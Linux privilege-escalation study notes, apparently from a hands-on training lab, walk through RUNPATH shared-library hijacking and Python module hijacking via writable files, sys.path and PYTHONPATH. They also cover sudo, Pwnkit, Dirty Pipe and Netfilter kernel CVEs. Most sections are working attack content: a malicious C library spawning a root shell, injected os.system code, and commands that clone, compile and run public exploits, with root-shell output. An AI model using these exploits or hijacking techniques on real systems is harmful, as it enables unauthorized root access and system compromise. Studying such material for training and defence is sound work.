-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

```bash
$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

We see a non-standard library named `libshared.so` listed as a dependency for the binary.

As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utility.

```bash
$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

This misconfiguration can be exploited by placing a malicious library in `/development`, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

Before compiling a library, we need to find the function name called by the binary.

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```bash
$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

We can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.`so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
$ gcc src.c -fPIC -shared -o /development/libshared.so
```

```bash
$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

# Python Library Hijacking

There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable

## Wrong Write Permissions

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.

```bash
$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Such permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. We can import the module `os` for testing purposes, which allows us to execute system commands. With this, we can insert the command `id` and check during the execution of the script if the inserted code is executed.

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

```bash
$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Now that we have the desired result, we can edit the library again, but this time, insert a reverse shell that connects to our host as `root`.

## Library Path

The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:

```bash
$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python36.zip
/usr/lib/python3.6
/usr/lib/python3.6/lib-dynload
/usr/local/lib/python3.6/dist-packages
/usr/lib/python3/dist-packages
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

```bash
$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

```bash
$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

In order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack.

```bash
$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

## PYTHONPATH Environment Variable

We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

```bash
$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.

```bash
$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`.

# Sudo

The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

```bash
$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

```bash
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

```bash
$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Sudo Policy Bypass

Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

```bash
$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

```bash
$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.

```bash
$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

Other example :

```bash
htb-student@ubuntu:~$ sudo -l
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
htb-student@ubuntu:~$
htb-student@ubuntu:~$
htb-student@ubuntu:~$ sudo -u#-1 /bin/ncdu
# whoami
root
```

# Polkit

PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, `polkit` is asked.

Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

- `pkexec` - runs a program with the rights of another user or with root rights
- `pkaction` - can be used to display actions
- `pkcheck` - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.

```bash
$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root
```

In the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.

```bash
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

```shell
$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```

# Dirty Pipe

  A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.

In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.

```bash
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

After compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.

```shell
$ uname -r

5.13.0-46-generic
```

```bash
./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

```shell
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
```

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

```shell
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```

# Netfilter

`Netfilter` is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. `Netfilter` is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters. These modules can then intercept and manipulate packets. This includes the programs like `iptables` and `arptables`, which serve as action mechanisms of the `Netfilter` hook system of the IPv4 and IPv6 protocol stack.

This kernel module has three main functions:

1. Packet defragmentation
2. Connection tracking
3. Network address translation (NAT)

When the module is activated, all IP packets are checked by the `Netfilter` before they are forwarded to the target application of the own or remote system. In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.

## CVE-2021-22555

Vulnerable kernel versions: 2.6 - 5.11

```shell
cry0l1t3@ubuntu:~$ uname -r

5.10.5-051005-generic
```

```bash
cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
cry0l1t3@ubuntu:~$ ./exploit

[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets and message queues...

[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes in primary messages...
[*] Triggering out-of-bounds write...
[*] Searching for corrupted primary message...
[+] fake_idx: fff
[+] real_idx: fdf

...SNIP...

root@ubuntu:/home/cry0l1t3# id
```

## CVE-2022-25636

A recent vulnerability is [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) and affects Linux kernel 5.4 through 5.6.10. This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write. `Nick Gregory` wrote a very detailed [article](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) about how he discovered this vulnerability.

```shell
cry0l1t3@ubuntu:~$ uname -r

5.13.0-051300-generic
```

However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.

```shell
cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit

[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[+] child  net_device ptr: 0xffff99128e5a9000

[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
[+] net_device struct freed

[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[+] obtained net_device struct

[*] STEP 4: Leak kaslr
[*] kaslr leak: 0xffffffff823093c0
[*] kaslr base: 0xffffffff80ffefa0

[*] STEP 5: Release setxattrs, free net_device, and realloc it again
[+] obtained net_device struct

[*] STEP 6: rop :)

# id

uid=0(root) gid=0(root) groups=0(root)
```

## CVE-2023-32233

This vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`. These `nf_tables` are temporary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (`Use-After-Free`) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.

The exploitation is done by manipulating the system to use the `cleared out` anonymous sets to interact with the kernel's memory. By doing so, we can potentially gain `root` privileges.

```bash
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

```bash
cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit

[*] Netfilter UAF exploit

Using profile:
========
1                   race_set_slab                   # {0,1}
1572                race_set_elem_count             # k
4000                initial_sleep                   # ms
100                 race_lead_sleep                 # ms
600                 race_lag_sleep                  # ms
100                 reuse_sleep                     # ms
39d240              free_percpu                     # hex
2a8b900             modprobe_path                   # hex
23700               nft_counter_destroy             # hex
347a0               nft_counter_ops                 # hex
a                   nft_counter_destroy_call_offset # hex
ffffffff            nft_counter_destroy_call_mask   # hex
e8e58948            nft_counter_destroy_call_check  # hex
========

[*] Checking for available CPUs...
[*] sched_getaffinity() => 0 2
[*] Reserved CPU 0 for PWN Worker
[*] Started cpu_spinning_loop() on CPU 1
[*] Started cpu_spinning_loop() on CPU 2
[*] Started cpu_spinning_loop() on CPU 3
[*] Creating "/tmp/modprobe"...
[*] Creating "/tmp/trigger"...
[*] Updating setgroups...
[*] Updating uid_map...
[*] Updating gid_map...
[*] Signaling PWN Worker...
[*] Waiting for PWN Worker...

...SNIP...

[*] You've Got ROOT:-)

# id

uid=0(root) gid=0(root) groups=0(root)
```

